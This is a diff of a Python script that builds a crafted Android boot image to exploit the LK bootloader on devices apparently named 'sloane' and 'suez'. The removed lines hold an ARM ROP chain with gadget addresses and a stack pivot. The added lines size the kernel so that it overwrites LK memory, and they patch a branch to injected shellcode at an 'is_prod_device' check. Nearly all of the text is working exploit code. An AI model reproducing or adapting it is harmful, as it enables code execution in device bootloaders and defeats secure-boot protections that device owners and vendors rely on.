@@ -5,43 +5,23 @@ import struct
 base = 0x41E00000
 forced_addr = 0x40080000
 
-# 5f53e:       bd0b            pop     {r0, r1, r3, pc}
-pop_r0_r1_r3_pc = base + 0x5f53e|1
+page_size = 0x800 # sloane forces 0x800 bytes
 
-# 2a6ec:       e49df004        pop     {pc}            ; (ldr pc, [sp], #4)
-pop_pc = base + 0x2a6ec
-
-# 1ac:       4798            blx     r3 ;  pop     {r3, pc}
-blx_r3_pop_r3 = base + 0x1ac|1
-
-cache_func = base + 0x2A6DC
-
-#test = base + 0x1C3 # prints "Error, the pointer of pidme_data is NULL."
-test = base + 0x3D160 # prints "Error, the pointer of pidme_data is NULL."
+is_prod_device_offset = 0x42948
 
 shellcode_sz = 0x1000 # TODO: check size
 
 lk_offset = base - forced_addr
 
-#inject_offset = 0x1000000
 inject_offset = lk_offset - shellcode_sz - 0x100
 
 inject_addr = forced_addr + inject_offset + 0x10
 shellcode_addr = forced_addr + inject_offset + 0x100
 
-# 42120:       e913e7cd        ldmdb   r3, {r0, r2, r3, r6, r7, r8, r9, sl, sp, lr, pc}
-pivot = base + 0x42120;
-
-ptr_offset = 0x75CE8;
-
-r3_pc = base + (ptr_offset - 0x18) 
-ptr_pc = base + (ptr_offset - 0x08)
-
-lk_r3_target = inject_addr + 0x10
-lk_ptr_target = inject_addr + 0x14
-
-page_size = 0x800 # suez forces 0x800 bytes
-
+kernel_size = lk_offset + is_prod_device_offset + 0x6
+if kernel_size % page_size != 0:
+    kernel_size = ((kernel_size // page_size) + 1) * page_size
+boot_size = kernel_size + (2 * page_size)
 
 def main():
     if len(sys.argv) < 2:
@@ -54,40 +34,12 @@ def main():
         args = sys.argv
 
     with open(args[1], "rb") as fin:
-        orig = fin.read(ptr_offset + 0x200)
-        fin.seek(ptr_offset + 0x200 + 0x8)
-        pad_len = ((len(orig) // 0x800) + 1) * 0x800
-        #orig2 = fin.read(pad_len - len(orig) - 0x8)
-        orig2 = fin.read()
+        orig = fin.read()
 
     hdr = b"ANDROID!"
-    hdr += struct.pack("<II", lk_offset + ptr_offset + 0x8, forced_addr)
-    #hdr += bytes.fromhex("0000000000000044000000000000F0400000004840000000000000002311040E00000000000000000000000000000000")
+    hdr += struct.pack("<II", kernel_size, forced_addr)
     hdr += bytes.fromhex("0000000000000044000000000000F0400000004800080000000000002311040E00000000000000000000000000000000")
     hdr += b"bootopt=64S3,32N2,32N2" # This is so that TZ still inits, but LK thinks kernel is 32-bit - need to fix too!
-    hdr += b"\x00" * 0xA
-    hdr += b"\x00" * (page_size - 0x40)
-    hdr += b"\x00" * inject_offset
-    hdr += struct.pack("<II", inject_addr + 0x40, test) # r3, pc (+0x40 because gadget arg points at the end of ldm package)
-    hdr += b"\x00" * 0x1C
-    hdr += struct.pack("<III", inject_addr + 0x50, 0, pop_pc) # sp, lr, pc
-
-    hdr += b"\x00" * (0xC + 0x4)
-
-    # clean dcache, flush icache, then jump to payload
-    chain = [
-        pop_r0_r1_r3_pc,
-        shellcode_addr,                              # r0
-        shellcode_sz,                                # r1
-        cache_func,                                  # r3
-
-        blx_r3_pop_r3,                               # pc
-        0xDEAD,                                      # r3
-
-        shellcode_addr                               # pc
-    ]
-    chain_bin = b"".join([struct.pack("<I", word) for word in chain])
-    hdr += chain_bin
 
     want_len = shellcode_addr - inject_addr + page_size + 0x10
     hdr += b"\x00" * ((want_len + inject_offset) - len(hdr))
@@ -104,9 +56,9 @@ def main():
 
     hdr += b"\x00" * (lk_offset + page_size - len(hdr) - 0x200)
 
-    hdr += orig
-    hdr += struct.pack("<ii", lk_r3_target, lk_ptr_target)
-    hdr += orig2
+    hdr += orig[:is_prod_device_offset + 0x200]
+    hdr += b"\xbc\xf7\x5a\xeb" # blx shellcode_addr
+    hdr += orig[is_prod_device_offset + 0x200 + 4:]
 
     payload_block = (inject_offset // 0x200)
     print("Payload Address: " + hex(shellcode_addr))
@@ -123,6 +75,9 @@ def main():
         print("Writing " + args[3] + "...")
         with open(args[3], "wb") as fout:
             fout.write(hdr)
+        print("Writing " + args[3] + ".lk.bin ...")
+        with open(args[3] + ".lk.bin", "wb") as fout:
+            fout.write(hdr[lk_offset + page_size - 0x200:])
 
 
 if __name__ == "__main__":
